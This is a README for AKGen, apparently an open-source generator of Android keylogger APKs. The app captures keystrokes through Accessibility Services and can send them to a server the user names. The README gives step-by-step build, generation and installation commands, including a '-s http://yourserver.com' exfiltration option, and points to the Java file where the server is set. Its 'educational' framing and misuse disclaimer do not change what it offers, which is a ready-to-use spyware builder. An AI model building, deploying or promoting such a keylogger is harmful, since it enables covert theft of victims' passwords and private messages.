# Android Keylogger Generator (AKGen)

AKGen is an open-source tool that allows users to generate a custom keylogger APK for Android devices. This tool is strictly for educational and ethical purposes. It helps users understand how keyloggers work and how to protect against them.

---

## Features
- **Customizable Keylogger:** Generate a keylogger APK with your own settings.
- **Local or Remote Logging:** Save keystrokes locally or send them to a remote server.
- **Tested on Kali Linux:** Fully compatible with Kali Linux.

---

## Prerequisites
Before using AKGen, ensure you have the following installed:
1. **Python 3** (Pre-installed on Kali Linux)
2. **Android SDK** (Download from [developer.android.com](https://developer.android.com/studio))
3. **Gradle** (Install using `sudo apt install gradle`)
4. **Git** (Install using `sudo apt install git`)


---

## Installation
1. Clone the repository:
```bash
git clone https://github.com/trmxvibs/AKGen
cd AKGen
```
2. Install required dependencies:
 ```bash
pip install argparse subprocess os shutil
```

3. Set up Android SDK and Gradle:

Download and install Android SDK.

Set environment variables:
```bash
export ANDROID_HOME=/path/to/android-sdk
export PATH=$PATH:$ANDROID_HOME/tools/bin
```
---

# How to Use
Step 1: Generate the APK
Run the following command to generate the keylogger APK:
```bash
python akgen.py -o akgen.apk -s http://yourserver.com
```
`-o`: Output APK file name.

`-s`: Server URL to send keystrokes (optional). If not provided, keystrokes will be saved locally.


# Step 2: Install the APK
Transfer the generated APK (`akgen.apk`) to your Android device.

Install the APK on your device.

 # Step 3: Enable Keylogger
Open the app on your Android device.

Click the "Enable Keylogger" button.

Grant the necessary permissions (Accessibility Services).
---
# Customization
You can customize the keylogger APK as per your requirements:

1. Change Server URL
Modify the `-s` parameter in the command to specify your server URL:
```
python akgen.py -o output.apk -s http://your-custom-server.com
```
2. Modify Keylogger Logic
Edit the KeyLoggerService.java file in the template_apk folder to change the keylogger behavior:

`private static final String SERVER_URL = "YOUR_SERVER_URL`


3. Modify UI
Edit the `activity_main.xml` file in the `template_apk` folder to change the app's user interface.


---

# How It Works -
APK Generation:

The `akgen.py` script modifies the template APK based on user input (e.g., server URL).

It builds the APK using Gradle.

Keylogger Functionality:

The app uses Android's Accessibility Services to capture keystrokes.

Captured keystrokes are either saved locally or sent to a remote server.




# License
This project is licensed under the MIT License. See the LICENSE file for details.

# Contributing
Contributions are welcome! If you have any suggestions or improvements, feel free to open an issue or submit a pull request.

# Disclaimer
The developers are not responsible for any misuse of this tool. Use it at your own risk.






















